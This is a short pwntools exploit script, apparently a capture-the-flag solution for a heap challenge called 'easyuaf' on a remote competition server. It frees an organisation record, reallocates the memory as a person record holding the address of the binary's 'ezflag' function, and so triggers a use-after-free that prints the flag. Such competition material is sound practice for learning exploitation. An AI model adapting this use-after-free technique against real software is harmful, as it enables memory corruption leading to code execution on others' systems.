from pwn import *
from typing import List, Union
from re import findall
context.binary = './easyuaf'
context.log_level = 'debug'
r = remote('challs.nusgreyhats.org', 10525)

def cmd(opt: int, *args: Union[int,bytes]):
    r.sendlineafter('> ', str(opt))
    for arg in args:
        if isinstance(arg, int):
            arg = b'%d' % arg
        r.sendlineafter(': ', arg)

def new_person(ind: int, name: bytes, age: int, contact_personal: int, contact_business: int):
    assert ind in range(128)
    assert len(name)<=22
    cmd(1, ind, name, age, contact_personal, contact_business)
def new_org(ind: int, name: bytes, style: int):
    assert ind in range(128)
    assert style in range(1,4)
    assert len(name)<=22
    cmd(2, ind, name, style)
def del_org(ind: int):
    assert ind in range(128)
    cmd(3, ind)
def find_int(s: bytes) -> int:
    return int(findall(b'[0-9]+', s)[0])
def print_name(org: int, ind: int):
    assert org in range(128)
    assert ind in range(128)
    cmd(4, org, ind)
    r.recvuntil('*** Org:  ')
    org_name = r.recv(8)
    org_id = find_int(r.recvline())
    r.recvuntil(b': ')
    p_name = r.recvline().strip()
    p_id = find_int(r.recvline())
    p_age = find_int(r.recvline())
    p_personal = find_int(r.recvline())
    p_business = find_int(r.recvline())
    return (org_name, org_id, p_name, p_id, p_age, p_personal, p_business)
def end(): cmd(5)

new_org(0, b'TKAI_CORP_TO_THE_MOON', 1)
new_person(0, b'tkai', 20, 0, 0)
del_org(0)
new_person(1, b'tkai2', 0, context.binary.symbols['ezflag'], 0)
print(print_name(0,0))

r.interactive()
